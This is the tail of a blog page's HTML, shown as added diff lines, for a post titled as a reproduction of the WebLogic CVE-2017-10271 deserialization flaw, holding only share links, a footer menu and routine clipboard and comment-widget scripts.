+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&text=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&is_video=false&description=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现&body=Check out this article: https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&title=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&name=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2025/03/24/WebSecurity/cve/weblogiccve/&t=【CVE复现】WebLogic XMLDecoder反序列化漏洞(CVE-2017-10271)漏洞复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    g0dam
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/idea/">Idea</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'owner/githubrepo';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
